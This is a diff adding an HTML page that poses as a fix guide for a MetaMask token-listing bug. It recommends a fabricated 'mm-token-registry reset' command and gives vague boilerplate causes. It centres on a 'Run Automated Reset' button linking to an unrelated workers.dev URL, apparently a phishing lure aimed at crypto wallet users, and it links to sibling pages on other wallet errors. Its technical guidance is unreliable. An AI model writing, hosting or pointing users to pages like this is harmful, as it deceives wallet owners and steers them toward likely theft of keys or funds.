@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Manage Tokens Miss Match With Net – Fix Guide</title>
+<style>
+    body {
+        font-family: sans-serif;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users experience a mismatch between the tokens displayed in the "Manage Tokens" section of the Metamask extension and the network filter, resulting in incorrect token listings.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a desynchronization between the Metamask extension's internal token registry and the Ethereum network's token listings, often caused by outdated extension versions, incorrect network configurations, or incomplete token data.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Update the Metamask extension to the latest version and restart the browser.</li>
+<li>Reset the Metamask token registry by executing the following command:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>mm-token-registry<span class="w"> </span>reset<span class="w"> </span>--network<span class="w"> </span>mainnet
+</code></pre></div>
+
+<ul>
+<li>Manually add the missing tokens using the token contract address and decimal value.</li>
+</ul>
+<p>Prerequisites:
+* Metamask extension installed and configured for the Ethereum network
+* Basic understanding of Ethereum token contracts and decimal values
+* Latest version of the browser and Metamask extension</p>
+<p>For advanced troubleshooting, consider utilizing an external console to execute low-level commands and query the Ethereum network directly.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
